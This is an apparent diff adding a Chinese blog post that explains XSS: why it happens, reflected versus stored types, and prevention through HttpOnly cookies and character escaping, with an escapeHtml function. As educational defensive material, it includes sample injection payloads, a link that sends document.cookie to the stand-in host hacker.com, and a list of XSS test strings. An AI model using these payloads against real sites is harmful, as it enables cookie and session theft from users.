@@ -1,0 +1,177 @@
+
+<!doctype html>
+<html lang="zh">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+
+  <meta name="generator" content="TiddlyWiki" />
+  <meta name="tiddlywiki-version" content="5.2.1" />
+
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="mobile-web-app-capable" content="yes" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <meta name="format-detection" content="telephone=no">
+
+  <link id="faviconLink" rel="shortcut icon" href="/favicon.ico">
+
+<title>2017-06-30 简单总结一下 XSS ~ 蒋继发 (ThaddeusJiang)</title>
+<meta name="description" content="你听说过 XSS 吗？">
+
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thaddeusjiang.com/2017-06-30–jian-dan-zong-jie-yi-xia-xss" />
+<meta property="og:title" content="2017-06-30 简单总结一下 XSS ~ 蒋继发 (ThaddeusJiang)" />
+<meta property="og:description" content="你听说过 XSS 吗？" />
+<meta property="og:image" content="https://og-image-zh.vercel.app/2017-06-30 简单总结一下 XSS.png?fontSize=50px" />
+<meta property="article:author" content="@ThaddeusJiang" />
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@ThaddeusJiang">
+<meta name="twitter:creator" content="@ThaddeusJiang">
+<meta name="twitter:title" content="2017-06-30 简单总结一下 XSS ~ 蒋继发 (ThaddeusJiang)" />
+<meta name="twitter:description" content="你听说过 XSS 吗？" />
+<meta name="twitter:image" content="https://pbs.twimg.com/profile_images/1350408865834172417/Xq8w4cX7_400x400.jpg" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140310136-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-140310136-2');
+</script>
+
+<link rel="stylesheet" href="./css/tiddlyjam.min.css"/>
+
+<link rel="stylesheet" href="./css/vanilla.css"/>
+
+<script async src="https://kit.fontawesome.com/f8d8f6a864.js" crossorigin="anonymous"></script>
+</head>
+
+<body class="tc-body">
+  
+<div class="container">
+    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
+       蒋继发 (ThaddeusJiang)
+            </a>
+        </div>
+     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
+  </div>
+      
+
+<div class="container mt-5">
+  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
+      <div>
+          <div class="block content blog">
+            <h1 class="title">2017-06-30 简单总结一下 XSS</h1>
+            <hr>
+
+            <p>你听说过 XSS 吗？</p><p>XSS（Cross-site scripting, 跨站脚本）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。
+研究表明，最近几年 XSS 已经超过 “缓冲区溢出” 成为最流行的攻击方式，有 68%的网站可能遭受此类攻击。</p><p>那么检测一下你是否充分了解 XSS 吧</p><ol><li>XSS 为什么会发生？</li><li>XSS 有几种类型？</li><li>XSS 如何预防和修复？</li></ol><p>如果可以回答 👆3 个问题，这篇文章对你提升是微乎其微的。
+如果不可以，你可以花十分钟左右阅读一下。</p><p>我目前的客户是一家银行，因为企业特性和业务需求，对系统安全高度重视。</p><p>因此，我不得不分析了整个系统，从中找出未对应 XSS 的 Code 。说实话，虽然是企业内部系统，但是代码也不少，看代码看的我都快吐了。</p><blockquote><div>得益于此，让我对<code>XSS</code>的理解更加深了一层。</div></blockquote><h2 class="">1. XSS 为什么会发生？</h2><p>因为用户输入的数据被当成代码执行了。</p><p>那么，为什么用户输入的数据会被当成代码并且被执行呢？
+因为当用户输入尖括号<code>&lt; &gt;</code>，引号<code>'</code> <code>"</code>，斜杠<code>/</code>之类的特殊字符时，可能**破坏原始的代码结构**，导致输入的部分内容被当成代码，并且被执行。</p><p>[小例子]
+假如有下面一个 textbox</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"hello tj"</span>&gt;</span></code></pre><p><code>hello tj</code>是来自用户的输入，如果用户不是输入<code>hello tj</code>,而是输入<code>"/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p name="</code> 那么就会变成 👇 的样子。</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"address1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  alert(<span class="hljs-built_in">document</span>.cookie)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">name</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>可不可怕？</p><h2 class="">2. XSS 有几种类型？</h2><p>XSS 有两种类型，<code>反射型XSS</code>和<code>持久型XSS</code>。</p><h3 class="">反射型 XSS</h3><p>也就是非持久型 XSS，常见诱骗用户点击带有攻击代码的 URL 链接，链接被浏览器执行，从而攻击用户。
+只有当前用户被影响，影响范围：小。</p><p>[小例子]</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">a</span>
+  <span class="hljs-attr">href</span>=<span class="hljs-string">"http://xxx91.com/index?term=&lt;script&gt;window.open('http://hacker.com?yourcookie='+document.cookie)&lt;/script&gt;"</span>
+  &gt;</span>小姐姐<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>
+&gt;</span></code></pre><p>如果你点击了 👆 链接，你 cookie 信息就有可能被发送到黑客的服务器<code>http://hacker.com</code>。</p><p>虽然链接可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏攻击代码。</p><h3 class="">持久型 XSS</h3><p>也叫存储型 XSS，提交包含攻击代码的数据到服务器。
+所有浏览这部分数据的用户都将被攻击代码影响，影响范围：大</p><p>[小例子]</p><p>html 模版如下：</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"${message}"</span> /&gt;</span></code></pre><p>当从数据库查询的 message 如下：
+<code>"/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p name="</code>
+生成的 html 将变成 👇：</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"address1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  alert(<span class="hljs-built_in">document</span>.cookie)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">name</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>此时，html 可能已经不受我们控制了。</p><h2 class="">3. XSS 如何预防和修复？</h2><blockquote><div>原则：所有用户输入都是不可信的。（注意：攻击代码不一定仅在<code>&lt;script&gt;&lt;/script&gt;</code>中。）</div></blockquote><ul><li>预防 反射型 XSS</li></ul><p>将重要的 cookie 标记为<code>http only</code>，这样的话 Javascript 中的 document.cookie 语句就不能获取到 cookie 了。</p><ul><li>预防 持久型 XSS</li></ul><p>处理掉可能破坏原始代码结构的特殊字符。将特殊字符编码成转义字符，使其成为数据的一部分而不是代码。</p><p>[需要编码的 7 个字符]</p><pre><code>&amp;     –&gt;     &amp;amp;
+&lt;     –&gt;     &amp;lt;
+&gt;     –&gt;     &amp;gt;
+"     –&gt;     &amp;quot;
+`     -&gt;     &amp;#x60;
+'     –&gt;     &amp;#x27;
+/     –&gt;     &amp;#x2f;</code></pre><p>有两点需要特别说明的是:</p><ol><li>不推荐将单引号<code>'</code>编码为 <code>&amp;apos</code>; ，因为它并不是标准的 HTML 标签</li><li>需要对斜杠号<code>/</code>编码，因为在进行 XSS 攻击时，斜杠号对于关闭当前 HTML 标签非常有用</li></ol><h2 class="">（最后）</h2><ol><li>分享一段简单的代码</li></ol><pre class="js hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">value</span>) </span>{
+  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value !== <span class="hljs-string">"string"</span>) {
+    <span class="hljs-keyword">return</span> value
+  }
+  <span class="hljs-keyword">return</span> value.replace(<span class="hljs-regexp">/[&amp;&lt;&gt;`"'\/]/g</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) </span>{
+    <span class="hljs-keyword">return</span> {
+      <span class="hljs-string">"&amp;"</span>: <span class="hljs-string">"&amp;amp;"</span>,
+      <span class="hljs-string">"&lt;"</span>: <span class="hljs-string">"&amp;lt;"</span>,
+      <span class="hljs-string">"&gt;"</span>: <span class="hljs-string">"&amp;gt;"</span>,
+      <span class="hljs-string">"`"</span>: <span class="hljs-string">"&amp;#x60;"</span>,
+      <span class="hljs-string">'"'</span>: <span class="hljs-string">"&amp;quot;"</span>,
+      <span class="hljs-string">"'"</span>: <span class="hljs-string">"&amp;#x27;"</span>,
+      <span class="hljs-string">"/"</span>: <span class="hljs-string">"&amp;#x2f;"</span>,
+    }[result]
+  })
+}</code></pre><ol><li>分享一些用于检测 XSS 的测试用例</li></ol><pre class="html hljs"><code>&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  alert(<span class="hljs-built_in">document</span>.cookie)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+='&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  alert(<span class="hljs-built_in">document</span>.cookie)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  alert(<span class="hljs-built_in">document</span>.cookie)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  alert(<span class="hljs-built_in">document</span>.cookie)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+  alert(vulnerable)
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+  alert(<span class="hljs-string">"XSS"</span>)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert('XSS')"</span> /&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://xxx.com/yyy.png"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert('XSS')"</span> /&gt;</span></code></pre><p>希望这篇文章对你有帮助。
+</p>
+          </div>
+      </div>
+      <hr>
+  </div>
+</div>     
+
+
+<div class="comment giscus column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
+</div>
+
+<script async src="https://giscus.app/client.js"
+        data-repo="ThaddeusJiang/thaddeusjiang.github.io"
+        data-repo-id="MDEwOlJlcG9zaXRvcnkyNTY3NDMxMTc="
+        data-category="Announcements"
+        data-category-id="DIC_kwDOD02Wzc4CAJc1"
+        data-mapping="og:title"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+       >
+</script>
+
+<style>
+.comment {
+  width: 100%;
+  margin-top: 2.5rem;
+  padding: 0.5rem 1rem;
+}
+</style>
+
+
+<footer class="footer">
+    <div class="content has-text-centered">
+      <p>
+        Made by <a href="https://github.com/ThaddeusJiang">Thaddeus Jiang</a>
+      </p>
+    </div>
+  </footer>
+
+</body>
+</html>
